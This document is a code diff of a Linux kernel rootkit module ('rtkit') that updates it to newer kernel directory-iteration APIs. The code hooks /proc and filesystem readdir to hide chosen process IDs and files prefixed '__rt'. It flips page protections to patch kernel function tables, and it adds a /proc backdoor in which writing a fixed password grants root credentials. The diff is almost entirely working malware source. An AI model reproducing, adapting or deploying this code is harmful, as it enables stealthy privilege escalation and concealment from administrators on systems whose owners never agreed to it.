@@ -4,6 +4,8 @@
 #include <linux/string.h>
 #include <linux/cred.h>
 #include <linux/fs.h>
+#include <linux/slab.h>
+
 
 #define MIN(a,b) \
    ({ typeof (a) _a = (a); \
@@ -17,14 +19,36 @@ MODULE_LICENSE("Dual BSD/GPL");
 MODULE_AUTHOR("Arkadiusz Hiler<ivyl@sigillum.cc>");
 MODULE_AUTHOR("Michal Winiarski<t3hkn0r@gmail.com>");
 
+
+struct proc_dir_entry {
+        unsigned int low_ino;
+        umode_t mode;
+        nlink_t nlink;
+        kuid_t uid;
+        kgid_t gid;
+        loff_t size;
+        const struct inode_operations *proc_iops;
+        const struct file_operations *proc_fops;
+        struct proc_dir_entry *next, *parent, *subdir;
+        void *data;
+        atomic_t count;         /* use count */
+        atomic_t in_use;        /* number of callers into module in progress; */
+                        /* negative -> it's going away RSN */
+        struct completion *pde_unload_completion;
+        struct list_head pde_openers;   /* who did ->open, but not ->release */
+        spinlock_t pde_unload_lock; /* proc_fops checks and pde_users bumps */
+        u8 namelen;
+        char name[];
+};
+
+
 //STATIC VARIABLES SECTION
 //we don't want to have it visible in kallsyms and have access to it all the time
 static struct proc_dir_entry *proc_root;
 static struct proc_dir_entry *proc_rtkit;
 
-static int (*proc_readdir_orig)(struct file *, void *, filldir_t);
-//static int (*fs_readdir_orig)(struct file *, void *, filldir_t);
-static int (*fs_readdir_orig)(struct file *, struct dir_context *);
+static int (*proc_readdir_orig)(struct file *, struct dir_context *);
+static int (*fs_readdir_orig)  (struct file *, struct dir_context *);
 
 static filldir_t proc_filldir_orig;
 static filldir_t fs_filldir_orig;
@@ -79,50 +103,82 @@ static void set_addr_ro(void *addr)
 	pte_t *pte = lookup_address((unsigned long) addr, &level);
 	pte->pte = pte->pte &~_PAGE_RW;
 }
-
 //CALLBACK SECTION
-static int proc_filldir_new(void *buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type)
+static int proc_filldir_new(void *ptr, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type)
 {
 	int i;
 	for (i=0; i < current_pid; i++) {
 		if (!strcmp(name, pids_to_hide[i])) return 0;
 	}
 	if (!strcmp(name, "rtkit")) return 0;
-	return proc_filldir_orig(buf, name, namelen, offset, ino, d_type);
+	return proc_filldir_orig(ptr, name, namelen, offset, ino, d_type);
 }
 
-static int proc_readdir_new(struct file *filp, void *dirent, filldir_t filldir)
+static int proc_readdir_new(struct file *f, struct dir_context *d)
 {
-	proc_readdir_orig(filp, dirent, proc_filldir_new);	
-	return 0;
+	int ret;
+//	char* buf;
+//	char* tmp;
+	
+	struct dir_context dc = (struct dir_context) {
+		.actor = proc_filldir_new,
+		.pos = d->pos
+	};
+
+	// this global state is probably not a good idea anymore
+	// TODO: fix this
+	proc_filldir_orig = d->actor;
+	memcpy((void*)d, (void*)&dc, sizeof(struct dir_context));
+
+#if 0
+	buf = (char*)kmalloc(4096, GFP_KERNEL);
+	tmp = d_path(&f->f_path, buf, 4096);
+	if (tmp)
+		printk("Path: %s\n", tmp);
+	kfree(buf);
+#endif
+
+
+	ret = proc_readdir_orig(f, d);
+	
+	return ret;
+
 }
 
-//static int fs_filldir_new(void *buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type)
-
-static int fs_filldir_new(struct dir_context *ctx, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type)
+static int fs_filldir_new(void *ptr, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type)
 {
-	printk("%s\n", name);
+//	printk("%s\n", name);
 	if (hide_files && (!strncmp(name, "__rt", 4) || !strncmp(name, "10-__rt", 7))) return 0;
-	return fs_filldir_orig(ctx, name, namelen, offset, ino, d_type);
+	return fs_filldir_orig(ptr, name, namelen, offset, ino, d_type);
 }
 
 static int fs_readdir_new(struct file *f, struct dir_context *d)
 {
 	int ret;
-	char buf[4096];
+	char* buf;
 	char* tmp;
-//	printk("test\n");
+	
 	struct dir_context dc = (struct dir_context) {
-//		.actor = fs_filldir_new,
-		.actor = d->actor,
+		.actor = fs_filldir_new,
 		.pos = d->pos
 	};
 
+	// this global state is probably not a good idea anymore
+	// TODO: fix this
 	fs_filldir_orig = d->actor;
-	ret = fs_readdir_orig(f, &dc);
+	memcpy((void*)d, (void*)&dc, sizeof(struct dir_context));
+
+	buf = (char*)kmalloc(4096, GFP_KERNEL);
 	tmp = d_path(&f->f_path, buf, 4096);
 	if (tmp)
 		printk("Path: %s\n", tmp);
+	kfree(buf);
+
+
+	ret = fs_readdir_orig(f, d);
+	
+	
+	//ret = fs_readdir_orig(f, &dc);
 	return ret;
 //	return 0;
 }
@@ -143,7 +199,7 @@ ssize_t rtkit_read(struct file *f, char __user *buffer, size_t s, loff_t *off) {
 	size_t size;
 
 
-	printk("read %u\n", s);
+//	printk("read %u\n", s);
 	
 	sprintf(module_status, 
 "RTKIT\n\
@@ -169,9 +225,11 @@ STATUS\n\
 	*off = size;  
 	return size;
 }
+//static int rtkit_write(struct file *file, const char __user *buff, unsigned long count, void *data)
 
-static int rtkit_write(struct file *file, const char __user *buff, unsigned long count, void *data)
+static int rtkit_write(struct file *file, const char __user *buff, size_t count, loff_t *offset)
 {
+	//printk("%s\n", buff);
 	if (!strncmp(buff, "mypenislong", MIN(11, count))) { //changes to root
 		struct cred *credentials = prepare_creds();
 	//	credentials->uid = credentials->euid = 0;
@@ -201,7 +259,7 @@ static void procfs_clean(void)
 	}
 	if (proc_fops != NULL && proc_readdir_orig != NULL) {
 		set_addr_rw(proc_fops);
-		//proc_fops->readdir = proc_readdir_orig;
+		proc_fops->iterate = proc_readdir_orig;
 		set_addr_ro(proc_fops);
 	}
 }
@@ -210,41 +268,41 @@ static void fs_clean(void)
 {
 	if (fs_fops != NULL && fs_readdir_orig != NULL) {
 		set_addr_rw(fs_fops);
-		//fs_fops->readdir = fs_readdir_orig;
+		fs_fops->iterate = fs_readdir_orig;
 		set_addr_ro(fs_fops);
 	}
 }
 
 static int __init procfs_init(void)
 {
-	struct proc_dir_entry *proc_file_entry;
 
 	static const struct file_operations proc_file_fops = {
 		.owner = THIS_MODULE,
 		.read  = rtkit_read,
-		.write = rtkit_write,
+		.write = rtkit_write
 	};
 
-	proc_file_entry = proc_create("rtkit", 0, NULL, &proc_file_fops);
+	proc_rtkit = proc_create("rtkit", 0, NULL, &proc_file_fops);
+	if (proc_rtkit == NULL) return 0;
 
 #if 0
 	//new entry in proc root with 666 rights
 	proc_rtkit = create_proc_entry("rtkit", 0666, NULL);
-	if (proc_rtkit == NULL) return 0;
+	proc_rtkit->read_proc = rtkit_read;
+	proc_rtkit->write_proc = rtkit_write;
+#endif
+	
+	//substitute proc readdir to our wersion (using page mode change)
 	proc_root = proc_rtkit->parent;
 	if (proc_root == NULL || strcmp(proc_root->name, "/proc") != 0) {
 		return 0;
 	}
-	proc_rtkit->read_proc = rtkit_read;
-	proc_rtkit->write_proc = rtkit_write;
-	
-	//substitute proc readdir to our wersion (using page mode change)
+
 	proc_fops = ((struct file_operations *) proc_root->proc_fops);
-	proc_readdir_orig = proc_fops->readdir;
+	proc_readdir_orig = proc_fops->iterate;
 	set_addr_rw(proc_fops);
-	proc_fops->readdir = proc_readdir_new;
+	proc_fops->iterate = proc_readdir_new;
 	set_addr_ro(proc_fops);
-#endif
 	
 	return 1;
 }
@@ -277,15 +335,15 @@ static int __init rootkit_init(void)
 		fs_clean();
 		return 1;
 	}
-	module_hide();
-	printk("rk loaded\n");		
+//	module_hide();
+	//printk("rk loaded\n");		
 	
 	return 0;
 }
 
 static void __exit rootkit_exit(void)
 {
-	printk("unload\n");		
+	//printk("unload\n");		
 	procfs_clean();
 	fs_clean();
 }
